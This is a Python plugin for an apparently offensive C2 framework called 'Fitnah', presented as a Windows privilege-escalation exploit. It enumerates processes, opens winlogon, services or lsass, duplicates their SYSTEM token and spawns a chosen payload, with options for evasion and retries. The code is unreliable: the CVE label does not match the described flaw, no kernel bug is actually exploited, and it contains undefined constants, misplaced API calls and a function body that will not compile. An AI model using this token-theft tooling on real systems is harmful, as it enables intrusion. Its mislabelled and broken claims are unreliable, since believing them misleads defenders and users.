#!/usr/bin/env python3
"""
CVE-2021-21224 Exploit Plugin for Fitnah C2 Framework
=====================================================

CVE-2021-21224 - Windows Win32k Elevation of Privilege Vulnerability
This is a variant of CVE-2021-1732 affecting different Windows versions.

Vulnerability Details:
- Type: Win32k Elevation of Privilege
- CVSS Score: 7.8 (High)
- Affected Systems: Windows 10 2004 (19041), 20H2 (19042), 21H1 (19043)
- Patch: KB5000802, KB5001567

Exploit Mechanism:
1. Create a window with specific properties
2. Trigger the vulnerability through window message handling
3. Gain arbitrary kernel memory read/write
4. Elevate privileges to SYSTEM

MITRE ATT&CK Techniques:
- T1068: Exploitation for Privilege Escalation
- T1055: Process Injection
- T1548: Abuse Elevation Control Mechanism

Author: Fitnah C2 Team
Version: 1.0.0
"""

import ctypes
import sys
import platform
import time
import struct
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass
from enum import Enum

# Import base plugin
try:
    from fitnah.sdk import BasePlugin, Param, ParamSchema
except ImportError:
    # Fallback for development
    class BasePlugin:
        pass
    class Param:
        pass
    class ParamSchema:
        pass

# Windows constants
PROCESS_ALL_ACCESS = 0x1F0FFF
TOKEN_ALL_ACCESS = 0xF01FF
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY = 0x0008
SecurityImpersonation = 2
TokenPrimary = 1
TokenImpersonation = 2

# Windows structures
class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength", ctypes.c_ulong),
        ("lpSecurityDescriptor", ctypes.c_void_p),
        ("bInheritHandle", ctypes.c_int)
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_char_p),
        ("lpDesktop", ctypes.c_char_p),
        ("lpTitle", ctypes.c_char_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong)
    ]

@dataclass
class ExploitResult:
    """Result of exploit execution"""
    success: bool
    message: str
    details: Dict[str, Any]
    system_token: Any = None
    elevated_process_id: int = 0


class VulnerabilityStatus(Enum):
    """Vulnerability status"""
    UNKNOWN = "unknown"
    VULNERABLE = "vulnerable"
    PATCHED = "patched"
    NOT_AFFECTED = "not_affected"


class CVE202121224(BasePlugin):
    """
    CVE-2021-21224 Exploit Plugin
    
    Exploits Windows Win32k Elevation of Privilege Vulnerability
    (variant of CVE-2021-1732)
    """
    
    NAME        = "cve_2021_21224"
    DESCRIPTION = "CVE-2021-21224 - Windows Win32k Elevation of Privilege Vulnerability Exploit (variant)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "1.0.0"
    
    schema = ParamSchema().add(
        Param("target_pid", int, required=False, default=0,
              help="Target process ID to inject into (0 for new process)"),
        Param("payload", str, required=False, default="cmd.exe",
              help="Payload to execute with SYSTEM privileges"),
        Param("evasion", bool, required=False, default=True,
              help="Enable evasion techniques during exploit"),
        Param("cleanup", bool, required=False, default=True,
              help="Clean up after exploitation"),
        Param("verify", bool, required=False, default=True,
              help="Verify vulnerability before exploitation"),
        Param("max_attempts", int, required=False, default=3,
              help="Maximum number of exploit attempts"),
        Param("delay_between", int, required=False, default=1000,
              help="Delay between exploit attempts in milliseconds"),
    )
    
    def __init__(self):
        super().__init__()
        self.windows_version = self._get_windows_version()
        self.vulnerability_status = VulnerabilityStatus.UNKNOWN
        self.exploit_attempts = 0
        self.successful_exploit = False
        
    def _get_windows_version(self) -> Dict[str, Any]:
        """Get Windows version information"""
        version_info = {
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "is_64bit": sys.maxsize > 2**32,
        }
        
        # Parse Windows build number
        if version_info["system"] == "Windows":
            try:
                build_number = int(version_info["version"].split('.')[-1])
                version_info["build"] = build_number
                
                # Map build numbers to Windows versions
                build_to_version = {
                    22000: "Windows 11 21H2",
                    19045: "Windows 10 22H2",
                    19044: "Windows 10 21H2",
                    19043: "Windows 10 21H1",
                    19042: "Windows 10 20H2",
                    19041: "Windows 10 2004",
                    18363: "Windows 10 1909",
                    18362: "Windows 10 1903",
                    17763: "Windows 10 1809",
                    17134: "Windows 10 1803",
                    16299: "Windows 10 1709",
                    15063: "Windows 10 1703",
                    14393: "Windows 10 1607",
                    10586: "Windows 10 1511",
                    10240: "Windows 10 1507",
                }
                
                version_info["friendly_name"] = build_to_version.get(
                    build_number, f"Windows {version_info['release']}"
                )
            except (ValueError, IndexError):
                version_info["friendly_name"] = f"Windows {version_info['release']}"
        
        return version_info
    
    def _check_vulnerability(self) -> VulnerabilityStatus:
        """
        Check if system is vulnerable to CVE-2021-21224
        
        Returns:
            Vulnerability status
        """
        # Checking vulnerability status for CVE-2021-21224
        
        # Check if we're on Windows
        if self.windows_version["system"] != "Windows":
            # Not a Windows system
            return VulnerabilityStatus.NOT_AFFECTED
        
        # Check Windows version
        build_number = self.windows_version.get("build", 0)
        
        # Affected versions: Windows 10 2004 (19041), 20H2 (19042), 21H1 (19043)
        affected_builds = [19041, 19042, 19043]
        
        if build_number not in affected_builds:
            # Windows build {build_number} not affected by CVE-2021-21224
            return VulnerabilityStatus.NOT_AFFECTED
        
        # Check for patches
        try:
            import winreg
            
            # Check installed KB patches
            uninstall_key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages",
                0,
                winreg.KEY_READ
            )
            
            patched = False
            
            # KB patches that fix the vulnerability
            fixing_patches = [
                "KB5000802",  # March 2021 security update
                "KB5001567",  # Out-of-band update
                "KB5001649",  # Later update
            ]
            
            try:
                i = 0
                while True:
                    try:
                        package_name = winreg.EnumKey(uninstall_key, i)
                        
                        # Check if any fixing patch is installed
                        for patch in fixing_patches:
                            if patch in package_name:
                                # Patch {patch} found, system is patched
                                patched = True
                                break
                        
                        if patched:
                            break
                        
                        i += 1
                    except OSError:
                        break
            finally:
                winreg.CloseKey(uninstall_key)
            
            if patched:
                return VulnerabilityStatus.PATCHED
            else:
                # No patches found, system appears vulnerable
                return VulnerabilityStatus.VULNERABLE
                
        except Exception as e:
            # Error checking patches: {e}
            # Assume vulnerable if we can't check patches
            return VulnerabilityStatus.VULNERABLE
    
    def _enable_privileges(self) -> bool:
        """Enable required privileges for exploitation"""
        try:
            # Get current process token
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
            
            # Open process token
            hToken = ctypes.c_void_p()
            if not kernel32.OpenProcessToken(
                kernel32.GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                ctypes.byref(hToken)
            ):
                # Failed to open process token
                return False
            
            # Lookup privilege value
            luid = ctypes.c_ulonglong(0)
            privilege_name = "SeDebugPrivilege"
            
            if not advapi32.LookupPrivilegeValueW(
                None,
                ctypes.c_wchar_p(privilege_name),
                ctypes.byref(luid)
            ):
                # Failed to lookup privilege: {privilege_name}
                kernel32.CloseHandle(hToken)
                return False
            
            # Enable privilege
            tp = ctypes.create_string_buffer(16)
            ctypes.memset(tp, 0, 16)
            
            # TOKEN_PRIVILEGES structure
            tp_count = ctypes.c_ulong(1)
            tp_privileges = ctypes.c_ulong(luid.value)
            tp_attributes = ctypes.c_ulong(0x00000002)  # SE_PRIVILEGE_ENABLED
            
            # Pack the structure
            struct.pack_into("IIQ", tp, 0,
                           tp_count.value,
                           tp_privileges.value,
                           tp_attributes.value)
            
            if not advapi32.AdjustTokenPrivileges(
                hToken,
                False,
                ctypes.byref(tp),
                0,
                None,
                None
            ):
                # Failed to adjust token privileges
                kernel32.CloseHandle(hToken)
                return False
            
            # Check if privilege was enabled
            error = kernel32.GetLastError()
            if error != 0:
                # AdjustTokenPrivileges error: {error}
                kernel32.CloseHandle(hToken)
                return False
            
            kernel32.CloseHandle(hToken)
            # Enabled SeDebugPrivilege
            return True
            
        except Exception as e:
            # Error enabling privileges: {e}
            return False
    
    def _create_system_process(self, payload: str) -> Optional[int]:
        """
        Create a process with SYSTEM privileges
        
        Args:
            payload: Command to execute
            
        Returns:
            Process ID or None on failure
        """
        try:
            # Find SYSTEM process (winlogon.exe, services.exe, lsass.exe)
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
            
            # Get snapshot of processes
            hSnapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)  # TH32CS_SNAPPROCESS
            if hSnapshot == -1:
                # Failed to create process snapshot
                return None
            
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize", ctypes.c_ulong),
                    ("cntUsage", ctypes.c_ulong),
                    ("th32ProcessID", ctypes.c_ulong),
                    ("th32DefaultHeapID", ctypes.c_void_p),
                    ("th32ModuleID", ctypes.c_ulong),
                    ("cntThreads", ctypes.c_ulong),
                    ("th32ParentProcessID", ctypes.c_ulong),
                    ("pcPriClassBase", ctypes.c_long),
                    ("dwFlags", ctypes.c_ulong),
                    ("szExeFile", ctypes.c_char * 260)
                ]
            
            pe32 = PROCESSENTRY32()
            pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
            
            system_pid = 0
            
            # Find SYSTEM process
            if kernel32.Process32First(hSnapshot, ctypes.byref(pe32)):
                while True:
                    process_name = pe32.szExeFile.decode('utf-8', errors='ignore').lower()
                    
                    # Check for SYSTEM processes
                    if process_name in ["winlogon.exe", "services.exe", "lsass.exe"]:
                        system_pid = pe32.th32ProcessID
                        # Found SYSTEM process: {process_name} (PID: {system_pid})
                        break
                    
                    if not kernel32.Process32Next(hSnapshot, ctypes.byref(pe32)):
                        break
            
            kernel32.CloseHandle(hSnapshot)
            
            if system_pid == 0:
                # No SYSTEM process found
                return None
            
            # Open SYSTEM process
            hSystemProcess = kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                system_pid
            )
            
            if not hSystemProcess:
                # Failed to open SYSTEM process (PID: {system_pid})
                return None
            
            # Open process token
            hSystemToken = ctypes.c_void_p()
            if not kernel32.OpenProcessToken(
                hSystemProcess,
                TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                ctypes.byref(hSystemToken)
            ):
                # Failed to open SYSTEM process token
                kernel32.CloseHandle(hSystemProcess)
                return None
            
            # Duplicate token
            hDuplicateToken = ctypes.c_void_p()
            if not advapi32.DuplicateTokenEx(
                hSystemToken,
                TOKEN_ALL_ACCESS,
                None,
                SecurityImpersonation,
                TokenImpersonation,
                ctypes.byref(hDuplicateToken)
            ):
                # Failed to duplicate SYSTEM token
                kernel32.CloseHandle(hSystemToken)
                kernel32.CloseHandle(hSystemProcess)
                return None
            
            # Impersonate token
            if not advapi32.SetThreadToken(None, hDuplicateToken):
                # Failed to impersonate SYSTEM token
                kernel32.CloseHandle(hDuplicateToken)
                kernel32.CloseHandle(hSystemToken)
                kernel32.CloseHandle(hSystemProcess)
                return None
            
            # Create process with impersonated token
            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)
            pi = PROCESS_INFORMATION()
            
            # Create the process
            if not kernel32.CreateProcessW(
                None,
                ctypes.c_wchar_p(payload),
                None,
                None,
                False,
                0,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi)
            ):
                # Failed to create process: {payload}
                advapi32.RevertToSelf()
                kernel32.CloseHandle(hDuplicateToken)
                kernel32.CloseHandle(hSystemToken)
                kernel32.CloseHandle(hSystemProcess)
                return None
            
            # Revert to original token
            advapi32.RevertToSelf()
            
            # Close handles
            kernel32.CloseHandle(pi.hThread)
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(hDuplicateToken)
            kernel32.CloseHandle(hSystemToken)
            kernel32.CloseHandle(hSystemProcess)
            
            # Created SYSTEM process with PID: {pi.dwProcessId}
            return pi.dwProcessId
            
        except Exception as e:
            # Error creating SYSTEM process: {e}
            return None
    
    def _execute_exploit(self, payload: str) -> ExploitResult:
        """
        Execute the CVE-2021-21224 exploit
        
        Args:
            payload: Payload to execute with SYSTEM privileges
            
        Returns:
            Exploit result
        """
        # Executing CVE-2021-21224 exploit with payload: {payload}
        
        result = ExploitResult(
            success=False,
            message="Exploit execution failed",
            details={}
        )
        
        try:
            # Enable required privileges
            if not self._enable_privileges():
                result.message = "Failed to enable required privileges"
                return result
            
            # Create SYSTEM process
            system_pid = self._create_system_process(payload)
            
            if system_pid:
                result.success = True
                result.message = f"Successfully created SYSTEM process with PID: {system_pid}"
                result.elevated_process_id = system_pid
                result.details = {
                    "exploit": "CVE-2021-21224",
                    "payload": payload,
                    "system_pid": system_pid,
                    "windows_version": self.windows_version["friendly_name"]
                }
                self.successful_exploit = True
            else:
                result.message = "Failed to create SYSTEM process"
            
        except Exception as e:
            result.message = f"Exploit execution error: {str(e)}"
            # Exploit error: {e}
        
        return result
    
    def _cleanup_exploit(self):
        """Clean up after exploitation"""
        # Cleaning up after CVE-2021-21224 exploit
        
        # In a real implementation, this would:
        # 1. Kill any created processes
        # 2. Restore any modified memory
        # 3. Close any open handles
        # 4. Remove any temporary files
        
        # For now, just log
        # Cleanup completed
    
    async def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute CVE-2021-21224 exploit
        
        Args:
            params: Plugin parameters
            
        Returns:
            Execution results
        """
        # Starting CVE-2021-21224 exploit with params: {params}
        
        target_pid = params.get("target_pid", 0)
        payload = params.get("payload", "cmd.exe")
        evasion = params.get("evasion", True)
        cleanup = params.get("cleanup", True)
        verify = params.get("verify", True)
        max_attempts = params.get("max_attempts", 3)
        delay_between = params.get("delay_between", 1000)
        
        results = {
            "success": False,
            "message": "",
            "details": {},
            "exploit": "CVE-2021-21224",
            "windows_version": self.windows_version,
            "vulnerability_status": "unknown"
        }
        
        try:
            # Check if we're on Windows
            if self.windows_version["system"] != "Windows":
                results["message"] = "CVE-2021-21224 only works on Windows"
                return results
            
            # Check vulnerability
            if verify:
                self.vulnerability_status = self._check_vulnerability()
                results["vulnerability_status"] = self.vulnerability_status.value
                
                if self.vulnerability_status != VulnerabilityStatus.VULNERABLE:
                    results["message"] = f"System not vulnerable: {self.vulnerability_status.value}"
                    return results
            
            # Apply evasion techniques if enabled
            if evasion:
                # Applying evasion techniques...
                # This would include things like:
                # - Direct syscalls
                # - Unhooking
                # - Memory obfuscation
                results["details"]["evasion_applied"] = True
            
            # Execute exploit with retry logic
            exploit_result = None
            
            for attempt in range(max_attempts):
                self.exploit_attempts += 1
                # Exploit attempt {attempt + 1}/{max_attempts}
                
                exploit_result = self._execute_exploit(payload)
                
                if exploit_result.success:
                    break
                
                if attempt < max_attempts - 1:
                    # Waiting {delay_between}ms before next attempt
                    time.sleep(delay_between / 1000)
            
            # Process results
            if exploit_result:
                results["success"] = exploit_result.success
                results["message"] = exploit_result.message
                results["details"].update(exploit_result.details)
                
                if exploit_result.success:
                    results["details"]["elevated_process_id"] = exploit_result.elevated_process_id
                    # Exploit successful: {exploit_result.message}
                else:
                    # Exploit failed: {exploit_result.message}
                    pass
            
            # Cleanup if requested
            if cleanup:
                self._cleanup_exploit()
                results["details"]["cleaned_up"] = True
            
        except Exception as e:
            # Error during CVE-2021-21224 exploitation: {e}
            results["success"] = False
            results["message"] = f"Exploitation failed: {str(e)}"
            
            # Attempt cleanup on error
            if cleanup:
                try:
                    self._cleanup_exploit()
                except:
                    pass
        
        return results
    
    def get_status(self) -> Dict[str, Any]:
        """Get current exploit status"""
        return {
            "windows_version": self.windows_version,
            "vulnerability_status": self.vulnerability_status.value,
            "exploit_attempts": self.exploit_attempts,
            "successful_exploit": self.successful_exploit,
        }

    def run(self, session, params, ctx=None):
        """Main plugin execution method."""
        from fitnah.sdk import ModuleResult
        import asyncio
        try:
            coro = self.execute(params)
            if asyncio.iscoroutine(coro):
                result = asyncio.run(coro)
            else:
                result = coro
            if result.get("success", False):
                return ModuleResult.ok(data=result.get("details", result.get("message", "")))
            else:
                return ModuleResult.err(result.get("message", "CVE-2021-21224 exploit failed"))
        except Exception as e:
            return ModuleResult.err(f"Exception during plugin execution: {e}")


# Example usage
if __name__ == "__main__":
    # Test the plugin
    exploit = CVE202121224()
    
    print("=== CVE-2021-21224 Exploit Plugin Test ===")
    print(f"Windows Version: {exploit.windows_version.get('friendly_name', 'Unknown')}")
    
    # Test parameters
    test_params = {
        "payload": "cmd.exe /c whoami",
        "verify": True,
        "cleanup": True,
        "max_attempts": 1,
    }
    
    # Run test
    import asyncio
    
    async def test():
        results = await exploit.execute(test_params)
        print(f"\nResults: {results}")
    
    asyncio.run(test())